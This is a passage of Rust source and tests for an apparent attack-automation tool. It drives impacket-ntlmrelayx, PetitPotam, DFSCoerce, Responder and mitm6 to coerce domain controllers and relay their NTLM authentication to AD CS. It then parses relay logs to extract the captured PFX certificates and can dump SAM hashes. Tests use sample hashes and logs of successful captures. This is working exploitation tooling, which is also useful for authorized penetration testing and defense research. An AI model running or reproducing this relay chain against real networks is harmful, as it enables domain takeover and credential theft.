            // `--adcs` writes "GOT CERTIFICATE! ID <n>" then "Writing PKCS#12 …".
            // `--ldap` userCertificate writes "Base64 certificate of user …".
            if s.contains("Base64 certificate of user")
                || s.contains("GOT CERTIFICATE!")
                || s.contains("Writing PKCS#12 certificate to")
            {
                return true;
            }
        }
        let now = Instant::now();
        if now >= deadline {
            return false;
        }
        let wait = std::cmp::min(interval, deadline - now);
        sleep(wait).await;
    }
}

/// Captured-cert metadata for the `--adcs` path: ntlmrelayx writes the PFX to
/// disk relative to its CWD and logs the path.
#[derive(Debug, Clone, PartialEq, Eq)]
struct PfxCapture {
    user: String,
    pfx_basename: String,
}

/// Walk the relay log, pair the most-recent authenticating-as-user line with
/// the most-recent "Writing PKCS#12 certificate to <path>" line. Returns None
/// if either marker is missing.
fn extract_pfx_capture_from_log(log: &str) -> Option<PfxCapture> {
    let mut last_user: Option<String> = None;
    let mut last_pfx: Option<String> = None;

    for line in log.lines() {
        // "[*] Authenticating against http://... as DOMAIN/USER$ SUCCEED"
        // "[*] SMBD-Thread-N: Connection from DOMAIN/USER$@ip controlled, attacking..."
        // Both shapes appear depending on flow; pull the user after the slash.
        if let Some(user) = parse_relayed_user(line) {
            last_user = Some(user);
        }
        // "[*] Writing PKCS#12 certificate to ./DC01.pfx"
        if let Some(idx) = line.find("Writing PKCS#12 certificate to ") {
            let after = &line[idx + "Writing PKCS#12 certificate to ".len()..];
            let path = after.split_whitespace().next().unwrap_or("");
            if !path.is_empty() {
                last_pfx = Some(path.to_string());
            }
        }
    }

    match (last_user, last_pfx) {
        (Some(u), Some(p)) => Some(PfxCapture {
            user: u,
            pfx_basename: p,
        }),
        // If we got a PFX path but no user, fall back to the file's basename
        // (ntlmrelayx names the PFX after the user).
        (None, Some(p)) => {
            let base = std::path::Path::new(p.trim_start_matches("./"))
                .file_stem()
                .and_then(|s| s.to_str())
                .unwrap_or("relayed")
                .to_string();
            Some(PfxCapture {
                user: base,
                pfx_basename: p,
            })
        }
        _ => None,
    }
}

/// Pull a relayed username out of a line that looks like
/// "DOMAIN/USERNAME$@target" or "DOMAIN/USERNAME@target". Returns the bare
/// username including any trailing `$`.
fn parse_relayed_user(line: &str) -> Option<String> {
    let at_idx = line.find('@')?;
    let prefix = &line[..at_idx];
    // Walk backwards from '@' to the slash that splits domain/user.
    let user_start = prefix.rfind('/')? + 1;
    let candidate: &str = prefix[user_start..]
        .split_terminator(|c: char| c.is_whitespace())
        .next()?;
    if candidate.is_empty() {
        return None;
    }
    // Heuristic — usernames here are word chars + an optional trailing $.
    if !candidate
        .chars()
        .all(|c| c.is_alphanumeric() || c == '$' || c == '_' || c == '-' || c == '.')
    {
        return None;
    }
    Some(candidate.to_string())
}

/// Parse the relay.log for the LAST captured cert. ntlmrelayx prints
/// `Base64 certificate of user <NAME>` followed by the base64 blob on the
/// next non-empty line. Returns (user, base64_blob).
fn extract_cert_from_log(log: &str) -> Option<(String, String)> {
    let mut last_user: Option<String> = None;
    let mut last_b64: Option<String> = None;
    let mut pending_user: Option<String> = None;

    for line in log.lines() {
        if let Some(idx) = line.find("Base64 certificate of user ") {
            let after = &line[idx + "Base64 certificate of user ".len()..];
            let name = after
                .split_whitespace()
                .next()
                .unwrap_or("")
                .trim_end_matches(':');
            if !name.is_empty() {
                pending_user = Some(name.to_string());
            }
            continue;
        }
        if let Some(user) = &pending_user {
            let trimmed = line.trim();
            if !trimmed.is_empty() {
                last_user = Some(user.clone());
                last_b64 = Some(trimmed.to_string());
                pending_user = None;
            }
        }
    }

    match (last_user, last_b64) {
        (Some(u), Some(b)) => Some((u, b)),
        _ => None,
    }
}

/// Relay captured NTLM authentication to multiple targets.
///
/// Optional args: `targets_file`, `target_ips` (comma-separated), `dump_sam`
///
/// If `target_ips` is provided, writes them to a temp file and uses `-tf`.
/// Otherwise, `targets_file` is used directly with `-tf`.
pub async fn ntlmrelayx_multirelay(args: &Value) -> Result<ToolOutput> {
    let targets_file = optional_str(args, "targets_file");
    let target_ips = optional_str(args, "target_ips");
    let dump_sam = optional_bool(args, "dump_sam").unwrap_or(false);

    let mut cmd = CommandBuilder::new("impacket-ntlmrelayx").timeout_secs(120);

    // Hold the temp file in scope so it lives until execute() completes.
    let _tmp_file;

    if let Some(ips) = target_ips {
        // Write comma-separated IPs as newline-separated entries in a temp file.
        let mut tf = tempfile::NamedTempFile::new()?;
        for ip in ips.split(',') {
            writeln!(tf, "{}", ip.trim())?;
        }
        tf.flush()?;
        let path = tf.path().to_string_lossy().to_string();
        cmd = cmd.flag("-tf", path);
        _tmp_file = Some(tf);
    } else if let Some(tf_path) = targets_file {
        cmd = cmd.flag("-tf", tf_path);
        _tmp_file = None;
    } else {
        _tmp_file = None;
    }

    cmd = cmd.arg_if(dump_sam, "--dump-sam");

    cmd.execute().await
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::executor::mock;
    use serde_json::json;

    #[tokio::test]
    async fn start_responder_executes() {
        mock::push(mock::success());
        let args = json!({});
        assert!(start_responder(&args).await.is_ok());
    }

    #[tokio::test]
    async fn start_responder_analyze_mode() {
        mock::push(mock::success());
        let args = json!({"interface": "eth1", "analyze_mode": true});
        assert!(start_responder(&args).await.is_ok());
    }

    #[tokio::test]
    async fn start_mitm6_executes() {
        mock::push(mock::success());
        let args = json!({"domain": "contoso.local"});
        assert!(start_mitm6(&args).await.is_ok());
    }

    #[tokio::test]
    async fn coercer_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(coercer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn coercer_with_creds_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "listener": "192.168.58.5",
            "username": "admin", "password": "P@ss", "domain": "contoso.local"
        });
        assert!(coercer(&args).await.is_ok());
    }

    #[tokio::test]
    async fn petitpotam_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(petitpotam(&args).await.is_ok());
    }

    #[tokio::test]
    async fn petitpotam_with_creds_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "192.168.58.1", "listener": "192.168.58.5",
            "username": "admin", "password": "P@ss", "domain": "contoso.local"
        });
        assert!(petitpotam(&args).await.is_ok());
    }

    #[tokio::test]
    async fn dfscoerce_executes() {
        mock::push(mock::success());
        let args = json!({"target": "192.168.58.1", "listener": "192.168.58.5"});
        assert!(dfscoerce(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_ldaps_executes() {
        mock::push(mock::success());
        let args = json!({"dc_ip": "192.168.58.1"});
        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_ldaps_delegate_access() {
        mock::push(mock::success());
        let args = json!({"dc_ip": "192.168.58.1", "delegate_access": true});
        assert!(ntlmrelayx_to_ldaps(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_adcs_executes() {
        mock::push(mock::success());
        let args = json!({"ca_host": "ca01.contoso.local"});
        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_adcs_with_template() {
        mock::push(mock::success());
        let args = json!({"ca_host": "ca01.contoso.local", "template": "User"});
        assert!(ntlmrelayx_to_adcs(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_smb_executes() {
        mock::push(mock::success());
        let args = json!({"target_ip": "192.168.58.1"});
        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_smb_with_socks() {
        mock::push(mock::success());
        let args = json!({"target_ip": "192.168.58.1", "socks": true, "interactive": true});
        assert!(ntlmrelayx_to_smb(&args).await.is_ok());
    }

    #[tokio::test]
    async fn relay_and_coerce_requires_secret() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_domain": "contoso.local"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("coerce_hash") || err.contains("coerce_password"));
    }

    #[tokio::test]
    async fn relay_and_coerce_rejects_quote_in_inputs() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_domain": "contoso.local",
            "coerce_password": "p'ass"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("forbidden"));
    }

    #[tokio::test]
    async fn relay_and_coerce_rejects_same_host() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.10",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        let err = relay_and_coerce(&args).await.unwrap_err().to_string();
        assert!(err.contains("must differ") || err.contains("loopback"));
    }

    #[test]
    fn parse_relay_coerce_args_accepts_legacy_target_dc_alias() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "target_dc": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        let cfg = super::parse_relay_coerce_args(&args).expect("legacy alias should parse");
        assert_eq!(cfg.coerce_target, "192.168.58.20");
    }

    #[test]
    fn parse_relay_coerce_args_with_hash() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100",
            "coerce_user": "alice",
            "coerce_hash": "b8d76e56e9dac90539aff05e3ccb1755",
            "coerce_domain": "contoso.local"
        });
        let cfg = super::parse_relay_coerce_args(&args).expect("valid args should parse");
        assert!(matches!(
            cfg.coerce_secret,
            Some(super::CoerceSecret::Hash(_))
        ));
    }

    #[test]
    fn parse_relay_coerce_args_unauth() {
        let args = json!({
            "ca_host": "192.168.58.10",
            "coerce_target": "192.168.58.20",
            "attacker_ip": "192.168.58.100"
        });
        let cfg = super::parse_relay_coerce_args(&args).expect("unauth args should parse");
        assert!(cfg.coerce_user.is_none());
        assert!(cfg.coerce_secret.is_none());
    }

    // ── Phase-progression coverage via FakeCoerceProcs ─────────────────────

    use std::collections::{HashMap, HashSet};
    use std::sync::Mutex;

    #[derive(Default, Clone)]
    struct PhaseScript {
        relay_log_append: Vec<u8>,
        /// (basename, bytes) — written into workdir when run_phase fires.
        pfx_drop: Option<(String, Vec<u8>)>,
    }

    #[derive(Debug, Clone)]
    struct RecordedPhaseCall {
        header: String,
        bin: String,
        args: Vec<String>,
    }

    struct FakeState {
        is_local_ip: bool,
        local_ips: Vec<String>,
        binaries_present: HashSet<String>,
        relay_early_exit: Option<i32>,
        relay_initial_log: Vec<u8>,
        relay_log_path: Option<std::path::PathBuf>,
        coerce_log_path: Option<std::path::PathBuf>,
        phase_scripts: HashMap<String, PhaseScript>,
        run_phase_calls: Vec<RecordedPhaseCall>,
    }

    struct FakeCoerceProcs {
        state: Mutex<FakeState>,
    }

    impl FakeCoerceProcs {
        fn new() -> Self {
            Self {
                state: Mutex::new(FakeState {
                    is_local_ip: true,
                    local_ips: vec!["10.0.0.1".into()],
                    binaries_present: ["petitpotam".to_string()].into_iter().collect(),
                    relay_early_exit: None,
                    relay_initial_log: Vec::new(),
                    relay_log_path: None,
                    coerce_log_path: None,
                    phase_scripts: HashMap::new(),
                    run_phase_calls: Vec::new(),
                }),
            }
        }

        fn with_local_ip(self, allowed: bool) -> Self {
            self.state.lock().unwrap().is_local_ip = allowed;
            self
        }

        fn with_only_binary(self, names: &[&str]) -> Self {
            let mut s = self.state.lock().unwrap();
            s.binaries_present.clear();
            for n in names {
                s.binaries_present.insert((*n).to_string());
            }
            drop(s);
            self
        }

        fn with_relay_exit(self, code: i32) -> Self {
            self.state.lock().unwrap().relay_early_exit = Some(code);
            self
        }

        fn with_relay_initial_log(self, bytes: &[u8]) -> Self {
            self.state.lock().unwrap().relay_initial_log = bytes.to_vec();
            self
        }

        fn with_phase_capture(self, header: &str, log_append: &[u8]) -> Self {
            self.state.lock().unwrap().phase_scripts.insert(
                header.to_string(),
                PhaseScript {
                    relay_log_append: log_append.to_vec(),
                    pfx_drop: None,
                },
            );
            self
        }

        fn with_phase_pfx_drop(
            self,
            header: &str,
            log_append: &[u8],
            pfx_basename: &str,
            pfx_bytes: &[u8],
        ) -> Self {
            self.state.lock().unwrap().phase_scripts.insert(
                header.to_string(),
                PhaseScript {
                    relay_log_append: log_append.to_vec(),
                    pfx_drop: Some((pfx_basename.to_string(), pfx_bytes.to_vec())),
                },
            );
            self
        }

        fn calls(&self) -> Vec<RecordedPhaseCall> {
            self.state.lock().unwrap().run_phase_calls.clone()
        }
    }

    struct FakeRelayHandle {
        pid: u32,
        early_exit: Option<i32>,
    }

    impl super::RelayHandle for FakeRelayHandle {
        fn pid(&self) -> u32 {
            self.pid
        }
        async fn settle_then_try_wait(&mut self, _settle: Duration) -> Option<i32> {
            self.early_exit.take()
        }
        async fn kill_and_wait(&mut self, _timeout: Duration) {}
    }

    impl super::CoerceProcs for FakeCoerceProcs {
        type Handle = FakeRelayHandle;

        fn is_local_ip(&self, _ip: &str) -> bool {
            self.state.lock().unwrap().is_local_ip
        }

        fn list_local_ips(&self) -> Vec<String> {
            self.state.lock().unwrap().local_ips.clone()
        }

        fn which_binary(&self, name: &str) -> bool {
            self.state.lock().unwrap().binaries_present.contains(name)
        }

        async fn cleanup_stale_listeners(&self, _workdir: &Path) {}

        async fn spawn_relay(
            &self,
            _target_url: &str,
            _template: &str,
            relay_log: &Path,
            _workdir: &Path,
        ) -> Result<Self::Handle> {
            let (initial_log, early_exit) = {
                let mut s = self.state.lock().unwrap();
                s.relay_log_path = Some(relay_log.to_path_buf());
                (s.relay_initial_log.clone(), s.relay_early_exit)
            };
            tokio::fs::write(relay_log, &initial_log)
                .await
                .context("fake spawn_relay: write initial relay.log")?;
            Ok(FakeRelayHandle {
                pid: 4242,
                early_exit,
            })
        }

        async fn run_phase(
            &self,
            coerce_log: &Path,
            header: &str,
            bin: &str,
            args: &[&str],
            cwd: &Path,
            _timeout_secs: u64,
        ) {
            let (script, relay_log) = {
                let mut s = self.state.lock().unwrap();
                s.coerce_log_path = Some(coerce_log.to_path_buf());
                s.run_phase_calls.push(RecordedPhaseCall {
                    header: header.to_string(),
                    bin: bin.to_string(),
                    args: args.iter().map(|x| (*x).to_string()).collect(),
                });
                let relay_log = s
                    .relay_log_path
                    .clone()
                    .unwrap_or_else(|| cwd.join("relay.log"));
                (s.phase_scripts.get(header).cloned(), relay_log)
            };
            // Append a phase header line to coerce.log so the path contract is
            // observable — production appends real subprocess output here.
            use tokio::io::AsyncWriteExt;
            if let Ok(mut f) = tokio::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(coerce_log)
                .await
            {
                let _ = f.write_all(format!("{header}\n").as_bytes()).await;
            }
            if let Some(script) = script {
                if !script.relay_log_append.is_empty() {
                    if let Ok(mut f) = tokio::fs::OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open(&relay_log)
                        .await
                    {
                        let _ = f.write_all(&script.relay_log_append).await;
                    }
                }
                if let Some((basename, bytes)) = &script.pfx_drop {
                    let _ = tokio::fs::write(cwd.join(basename), bytes).await;
                }
            }
        }
    }

    fn fast_opts() -> super::RunOptions {
        super::RunOptions {
            relay_settle: Duration::from_millis(0),
            poll_interval: Duration::from_millis(2),
            poll_phase_1: Duration::from_millis(15),
            poll_phase_2: Duration::from_millis(15),
            poll_phase_3: Duration::from_millis(15),
            post_capture_settle: Duration::from_millis(0),
            relay_kill_timeout: Duration::from_millis(15),
            keep_workdir_on_capture: false,
            // Tests run in parallel and would otherwise fight over the
            // single host-wide loopback sentinel port.
            acquire_host_lock: false,
            // Effectively skip the port-445 free check in tests — the mock
            // CoerceProcs doesn't actually bind anywhere, and a non-zero
            // wait_for_port_free probe would still slow the suite.
            bind_check: Duration::from_millis(0),
        }
    }

    fn cfg_unauth() -> super::RelayCoerceConfig {
        super::RelayCoerceConfig {
            ca_host: "192.168.58.10".into(),
            coerce_target: "192.168.58.20".into(),
            attacker_ip: "192.168.58.100".into(),
            coerce_user: None,
            coerce_domain: String::new(),
            coerce_secret: None,
            template: "DomainController".into(),
        }
    }

    fn cfg_with_creds() -> super::RelayCoerceConfig {
        super::RelayCoerceConfig {
            ca_host: "192.168.58.10".into(),
            coerce_target: "192.168.58.20".into(),
            attacker_ip: "192.168.58.100".into(),
            coerce_user: Some("alice".into()),
            coerce_domain: "contoso.local".into(),
            coerce_secret: Some(super::CoerceSecret::Hash(
                "b8d76e56e9dac90539aff05e3ccb1755".into(),
            )),
            template: "DomainController".into(),
        }
    }

    const PHASE1: &str = "Phase 1: unauth PetitPotam";
    const PHASE2: &str = "Phase 2: DFSCoerce";
    const PHASE3_EFSR: &str = "Phase 3: MS-EFSR";
    const PHASE3_RPRN: &str = "Phase 3: MS-RPRN";

    #[tokio::test]
    async fn run_attacker_ip_not_local_bails_with_clear_error() {
        let fake = FakeCoerceProcs::new().with_local_ip(false);
        let err = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("not a local interface IP"), "got: {err}");
    }

    #[tokio::test]
    async fn run_host_lock_contention_returns_busy_marker() {
        // Hold the sentinel port ourselves to simulate another in-flight
        // relay_and_coerce already running on this host.
        let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
            .expect("bind sentinel port for test");
        super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
        struct ResetFlag;
        impl Drop for ResetFlag {
            fn drop(&mut self) {
                super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(false));
            }
        }
        let _reset = ResetFlag;
        let mut opts = fast_opts();
        opts.acquire_host_lock = true;
        let fake = FakeCoerceProcs::new();
        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, opts)
            .await
            .unwrap();
        assert!(!out.success);
        assert!(
            out.stdout.contains("RELAY_BIND_BUSY"),
            "expected RELAY_BIND_BUSY, got: {}",
            out.stdout
        );
        // No phases or relay spawn should fire when the lock is contended.
        assert!(fake.calls().is_empty());
    }

    #[tokio::test]
    async fn ntlmrelayx_to_smb_returns_busy_when_lock_held() {
        let _holder = std::net::TcpListener::bind(("127.0.0.1", super::RELAY_LOCK_PORT))
            .expect("bind sentinel port for test");
        super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(true));
        struct ResetFlag;
        impl Drop for ResetFlag {
            fn drop(&mut self) {
                super::USE_REAL_RELAY_LOCK_IN_TEST.with(|c| c.set(false));
            }
        }
        let _reset = ResetFlag;
        let args = json!({"target_ip": "192.168.58.1"});
        let out = super::ntlmrelayx_to_smb(&args).await.unwrap();
        assert!(!out.success, "expected BUSY non-success, got success");
        assert!(
            out.stdout.contains("RELAY_BIND_BUSY"),
            "expected RELAY_BIND_BUSY in stdout, got: {}",
            out.stdout
        );
    }

    #[tokio::test]
    async fn run_relay_bind_failure_returns_marker() {
        let fake = FakeCoerceProcs::new()
            .with_relay_exit(98)
            .with_relay_initial_log(b"OSError: [Errno 98] Address already in use\n");
        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(!out.success);
        assert_eq!(out.exit_code, Some(98));
        assert!(out.stdout.contains("RELAY_BIND_FAILED"));
        assert!(out.stdout.contains("Address already in use"));
        // No phases should run when the relay died at startup.
        assert!(fake.calls().is_empty());
    }

    #[tokio::test]
    async fn run_phase1_capture_skips_phase2_and_3() {
        let log = b"[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.20 SUCCEED\n\
                    [*] GOT CERTIFICATE! ID 1\n\
                    [*] Writing PKCS#12 certificate to ./DC01.pfx\n";
        let fake = FakeCoerceProcs::new().with_phase_pfx_drop(PHASE1, log, "DC01.pfx", b"\xab\xcd");
        // Provide creds so we can verify phases 2/3 are skipped DESPITE creds.
        let out = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(out.success);
        assert!(out.stdout.contains("CERT_CAPTURED_VIA=unauth_petitpotam"));
        assert!(out.stdout.contains("RELAYED_USER=DC01$"));
        assert!(out.stdout.contains("PFX_FILE="));
        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
        assert_eq!(headers, vec![PHASE1]);
    }

    #[tokio::test]
    async fn run_phase1_miss_no_creds_skips_phase2_and_3() {
        let fake = FakeCoerceProcs::new();
        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(!out.success);
        assert!(!out.stdout.contains("CERT_CAPTURED_VIA"));
        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
        assert_eq!(headers, vec![PHASE1]);
    }

    #[tokio::test]
    async fn run_phase2_capture_skips_phase3() {
        let log = b"[*] (SMB): Authenticating CONTOSO/DC02$@192.168.58.20 SUCCEED\n\
                    [*] Writing PKCS#12 certificate to ./DC02.pfx\n";
        let fake = FakeCoerceProcs::new().with_phase_pfx_drop(PHASE2, log, "DC02.pfx", b"\x01\x02");
        let out = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(out.success);
        assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-DFSNM"));
        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
        assert_eq!(headers, vec![PHASE1, PHASE2]);
    }

    #[tokio::test]
    async fn run_phase3_efsr_miss_rprn_capture() {
        let log = b"[*] (SMB): Authenticating CONTOSO/DC03$@192.168.58.20 SUCCEED\n\
                    [*] Writing PKCS#12 certificate to ./DC03.pfx\n";
        let fake =
            FakeCoerceProcs::new().with_phase_pfx_drop(PHASE3_RPRN, log, "DC03.pfx", b"\x09");
        let out = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(out.success);
        assert!(out.stdout.contains("CERT_CAPTURED_VIA=MS-RPRN"));
        let headers: Vec<_> = fake.calls().into_iter().map(|c| c.header).collect();
        assert_eq!(headers, vec![PHASE1, PHASE2, PHASE3_EFSR, PHASE3_RPRN]);
    }

    #[tokio::test]
    async fn run_ldap_base64_extraction_decodes_to_workdir() {
        // Encode known plaintext so we can verify the decode path. The fake
        // emits both the "Authenticating ... DC01$@..." line AND a
        // "Base64 certificate of user DC01$:" block. extract_pfx_capture
        // returns None (no PKCS#12 line), so the LDAP base64 path runs.
        let pfx_bytes = b"PKCS12-FAKE";
        let b64 = base64::engine::general_purpose::STANDARD.encode(pfx_bytes);
        let mut log = b"[*] (SMB): Authenticating CONTOSO/DC01$@192.168.58.20 SUCCEED\n\
                        [*] Base64 certificate of user DC01$:\n"
            .to_vec();
        log.extend_from_slice(b64.as_bytes());
        log.extend_from_slice(b"\n");
        let fake = FakeCoerceProcs::new().with_phase_capture(PHASE1, &log);
        let out = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
            .await
            .unwrap();
        assert!(out.success, "stdout={}", out.stdout);
        assert!(out.stdout.contains("RELAYED_USER=DC01$"));
        // PFX_FILE should point at <workdir>/DC01$.pfx — confirm the
        // marker appears with that filename suffix.
        assert!(
            out.stdout.contains("DC01$.pfx"),
            "expected DC01$.pfx in stdout: {}",
            out.stdout
        );
    }

    #[tokio::test]
    async fn run_petitpotam_binary_fallback_uses_impacket_name() {
        let fake = FakeCoerceProcs::new().with_only_binary(&["impacket-petitpotam"]);
        let _ = super::run_relay_and_coerce(cfg_unauth(), &fake, fast_opts())
            .await
            .unwrap();
        let calls = fake.calls();
        let phase1 = calls
            .iter()
            .find(|c| c.header == PHASE1)
            .expect("phase 1 should run");
        assert_eq!(phase1.bin, "impacket-petitpotam");
    }

    #[tokio::test]
    async fn run_phase2_passes_credentials() {
        // No script: phase 2 misses, but we can inspect its argv.
        let fake = FakeCoerceProcs::new();
        let _ = super::run_relay_and_coerce(cfg_with_creds(), &fake, fast_opts())
            .await
            .unwrap();
        let calls = fake.calls();
        let phase2 = calls
            .iter()
            .find(|c| c.header == PHASE2)
            .expect("phase 2 should run");
        assert_eq!(phase2.bin, "dfscoerce");
        // Hash secret must surface as `-hashes :<hash>`.
        let joined = phase2.args.join(" ");
        assert!(joined.contains("-hashes"), "args: {joined}");
        assert!(joined.contains(":b8d76e56"), "args: {joined}");
        assert!(joined.contains("-u alice"), "args: {joined}");
    }

    #[test]
    fn extract_cert_from_log_picks_last_capture() {
        // Two captures in one log; we want the last one.
        let log = "\
[*] Servers started, waiting for connections\n\
[*] SMBD-Thread-1: Received connection from x\n\
[*] Authenticating against http://ca/certsrv/ as DC1$\n\
[*] Base64 certificate of user DC1$:\n\
MIIBlahFirstCert==\n\
[*] Servers started, waiting for connections\n\
[*] Base64 certificate of user DC2$:\n\
MIIBlahSecondCert==\n\
[*] done\n";
        let (user, b64) = super::extract_cert_from_log(log).expect("should extract");
        assert_eq!(user, "DC2$");
        assert_eq!(b64, "MIIBlahSecondCert==");
    }

    #[test]
    fn extract_cert_from_log_returns_none_without_marker() {
        let log = "[*] Servers started\n[*] no auth received\n";
        assert!(super::extract_cert_from_log(log).is_none());
    }

    #[test]
    fn extract_pfx_capture_picks_adcs_pair() {
        // Real `--adcs` log shape captured during ntlmrelayx ADCS relay.
        let log = "\
[*] Servers started, waiting for connections\n\
[*] SMBD-Thread-3: Received connection from 192.168.58.20, attacking target http://192.168.58.10/certsrv/certfnsh.asp\n\
[*] (SMB): Authenticating against http://192.168.58.10/certsrv/certfnsh.asp CONTOSO/DC01$@192.168.58.20 SUCCEED [1]\n\
[*] GOT CERTIFICATE! ID 6\n\
[*] Writing PKCS#12 certificate to ./DC01.pfx\n\
[*] done\n";
        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
        assert_eq!(cap.user, "DC01$");
        assert_eq!(cap.pfx_basename, "./DC01.pfx");
    }

    #[test]
    fn extract_pfx_capture_falls_back_to_basename_without_user() {
        let log = "[*] Writing PKCS#12 certificate to ./MEMBER1.pfx\n";
        let cap = super::extract_pfx_capture_from_log(log).expect("should extract");
        assert_eq!(cap.user, "MEMBER1");
        assert_eq!(cap.pfx_basename, "./MEMBER1.pfx");
    }

    #[test]
    fn extract_pfx_capture_returns_none_without_pfx_marker() {
        let log = "[*] (SMB): Authenticating against ... CONTOSO/DC01$@192.168.58.20 SUCCEED\n[*] auth complete";
        assert!(super::extract_pfx_capture_from_log(log).is_none());
    }

    #[test]
    fn parse_relayed_user_handles_domain_user_dollar_at_ip() {
        assert_eq!(
            super::parse_relayed_user("blah CONTOSO/DC01$@192.168.58.20 SUCCEED"),
            Some("DC01$".to_string())
        );
        assert_eq!(
            super::parse_relayed_user("(SMB): Authenticating CONTOSO/jdoe@192.168.58.10"),
            Some("jdoe".to_string())
        );
    }

    #[test]
    fn parse_relayed_user_returns_none_when_no_user() {
        // Lines with `@` but not a `domain/user` shape — URL-only, e.g.
        assert_eq!(super::parse_relayed_user("[*] Connection to host"), None);
        assert_eq!(super::parse_relayed_user("user@host"), None); // no slash
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_with_targets_file() {
        mock::push(mock::success());
        let args = json!({"targets_file": "/tmp/targets.txt"});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_with_target_ips() {
        mock::push(mock::success());
        let args = json!({"target_ips": "192.168.58.1,192.168.58.2", "dump_sam": true});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn ntlmrelayx_multirelay_no_targets() {
        mock::push(mock::success());
        let args = json!({});
        assert!(ntlmrelayx_multirelay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn wait_for_port_free_returns_ok_when_port_unused() {
        // High-numbered ephemeral port that nothing is listening on. The probe
        // should connect-refused immediately and return Ok.
        let port = 41446; // adjacent to RELAY_LOCK_PORT but unused
        let r = super::wait_for_port_free(port, std::time::Duration::from_millis(500)).await;
        assert!(r.is_ok(), "expected free port, got: {r:?}");
    }

    #[tokio::test]
    async fn wait_for_port_free_returns_err_when_port_held() {
        use tokio::net::TcpListener;
        // Bind a listener so the probe sees it as held.
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let r = super::wait_for_port_free(port, std::time::Duration::from_millis(200)).await;
        assert!(r.is_err(), "expected held port, got: {r:?}");
        // Listener is dropped at end of scope, releasing the port.
    }
}
